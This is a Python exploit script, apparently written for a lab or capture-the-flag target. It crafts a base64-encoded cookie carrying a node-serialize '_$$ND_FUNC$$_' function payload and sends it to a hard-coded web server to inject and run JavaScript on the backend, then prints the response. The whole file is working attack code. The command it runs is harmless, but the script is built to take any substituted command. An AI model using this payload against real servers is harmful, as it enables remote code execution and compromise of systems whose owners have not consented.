# simple_inject.py
# 
# This script takes no arguments
# This script creates a bad cookie based off the javascript given
# and injects javascript into the back-end of webserver
# 
# ! Must use node-serialize lib on backend for exploit to work !
# 
# e.g python simple_inject.py 

# for html parser
from bs4 import BeautifulSoup as bs
# for HTTP Requests
import requests
# for encoding to base64
import base64
# for formatting
import json

# target
webserver_url = 'http://192.168.2.201:8090'

# target/app
app_endpoint = webserver_url + '/app'

# username str for post params
# javascript for injection 
# command we want execute
command = "return 'EvilUser'"
# concat command into exploit function
user_str = "_$$ND_FUNC$$_function (){" + command + "}()"


print('Target: {}'.format(webserver_url))
print('Command selected: {}'.format(command))
print('Creating bad cookie...')

# create cookie dict using exploit function str and cookie name 'user'
cookie_dict = {'u': user_str}

# convert cookie dict to str
cookie_str = json.dumps(cookie_dict)

# encode cookie dict str into base64 str
ascii_cookie_bytes = cookie_str.encode('ascii')
base64_cookie_bytes = base64.b64encode(ascii_cookie_bytes)
encoded_cookie_str = base64_cookie_bytes.decode('ascii')

# create bad cookie
bad_cookie = {'user': encoded_cookie_str}

print('Bad cookie created:')
print()
print(bad_cookie)
print()

print('Trying Injection...')
# request webserver with bad cookie
response = requests.get(app_endpoint, cookies=bad_cookie)
# store status code of request
status_code = response.status_code
#store html for request
text = response.text
# parse html
soup = bs(text, 'html.parser')

if status_code == 200:
    print('Successful response :)')
    print()
    # print everything in body tags
    print(soup.body)
else:
    print('Failed :(')
